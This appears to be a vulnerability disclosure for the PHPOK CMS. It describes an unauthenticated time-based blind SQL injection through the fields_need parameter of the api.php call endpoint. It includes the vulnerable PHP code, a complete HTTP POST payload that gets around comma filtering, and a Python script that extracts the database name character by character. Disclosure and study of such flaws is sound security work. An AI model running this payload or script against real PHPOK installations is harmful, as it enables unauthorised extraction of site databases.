| There is a SQL injection in the function `index_f()` in phpok64/framework/api/call\_control.php. This function calls the `phpok()` function, in which a dynamic call exists.  The function `index_f()` receives parameters in JSON format and can control the function that is called dynamically. Although names of callable functions are stored in the database, the `_arclist` function in them is vulnerable.  In this way, we can use the `_arclist` function to call the `_arc_condition` function, and there are a lot of conditional splicing of SQL statement in it.  In fact, there are a lot of guards set up in this function and even in this CMS. ',<, and > will be escaped and the input will be filtered. However, we can manage to bypass some of them, resulting in a serious SQL injection vulnerability. Besides, no login behavior or privileges are required to trigger this vulnerability.  ``` // framework/phpok_call.php \phpok_call::_arc_condition line 714 if($rs['fields_need']){     $list = explode(",",$rs['fields_need']);     $tmp_int = array('int','float','smallint','mediumint','bigint','tinyint','decimal','double');     foreach($list as $key=>$value){         $tmp = explode(".",$value);         $f = $tmp[1] ? $tmp[1] : $tmp[0];         if(in_array($fields[$f]['field_type'],$tmp_int)){             $condition .= " AND ".$value." != 0";         }else{             $condition .= " AND ".$value." != ''";         }     }     unset($list); } ```  In this code fragment, the CMS will split our input with a comma as a separator, and then concatenate each fragment into the SQL statement. This means we cannot have commas in our payload. Therefore, I made it with the following payload.  ``` POST /api.php?c=call&f=index HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Sec-Fetch-Dest: script Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Connection: close Cookie: PHPSESSION=bd34va2vksdhvqr8t1sll4lva7; XDEBUG_SESSION=PHPSTORM Content-Type: application/x-www-form-urlencoded Content-Length: 138  data={"m_picplayer":{"_alias":"abc","fields_need":"CASE 1 WHEN (substr((select database()) from 1 for 1)=0x70) THEN sleep(5) ELSE 1 END"}} ```  Below are the results.  [image](https://user-images.githubusercontent.com/40927099/226076029-d337e30c-0628-4f2b-8e48-8c5ba48d14db.png)  [image](https://user-images.githubusercontent.com/40927099/226076037-bd842daa-1f0e-4904-af7a-46499a67c961.png)  As we can see, when the condition is true that the database name starts with 0x70 (i.e. the letter p), a delay of 5 seconds is generated. Otherwise, nothing happens.  Then we can write a python script to test the effect.  ``` import random import requests import time  url = "http://127.0.0.1/api.php?c=call&f=index" result_str = ""  for i in range(1, 30):     time.sleep(1.0)     print(i)     for j in range(32, 127):         payload1 = "{\"m_picplayer\":{\"_alias\":\"abc\",\"fields_need\":\"CASE 1 WHEN (substr((select database()) from %d for 1)="%i + hex(j) +") THEN sleep(4) ELSE 1 END"+"\"}}"         time.sleep(0.15)         data = {             'data': payload1         }         time1 = time.time()          res = requests.post(url, data=data)#, proxies=proxies)         time2 = time.time()         if time2 - time1 > 4:             result_str += chr(j)             print(result_str)             break ```  [image](https://user-images.githubusercontent.com/40927099/226076041-defde158-71fc-42be-8131-be3da469fb1c.png)  One thing to note is that each payload must be different, otherwise the cache mechanism will be triggered, and the database query will not be performed. |
